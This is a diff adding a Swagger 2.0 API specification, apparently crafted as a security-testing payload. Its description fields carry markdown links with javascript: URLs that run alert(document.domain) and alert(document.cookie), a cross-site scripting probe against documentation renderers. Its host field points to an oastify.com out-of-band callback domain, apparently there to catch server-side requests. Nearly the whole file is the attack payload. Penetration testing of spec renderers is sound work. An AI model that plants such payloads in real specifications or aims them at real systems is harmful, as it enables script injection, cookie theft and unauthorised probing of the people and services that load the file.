@@ -1,0 +1,24 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Test API",
+    "version": "1.0.0",
+    "description": "[🎯 CLICK HERE](javascript:alert(document.domain))"
+  },
+  "host": "j0kzzvv3jjt1iq2wwfe90udjtaz1n0bp.oastify.com",
+  "basePath": "/",
+  "schemes": ["https"],
+  "paths": {
+    "/test": {
+      "get": {
+        "summary": "Test",
+        "description": "[CLICK](javascript:alert(1)) or [XSS](javascript:alert(document.cookie))",
+        "responses": {
+          "200": {
+            "description": "[CLICK](javascript:alert(document.domain))"
+          }
+        }
+      }
+    }
+  }
+}
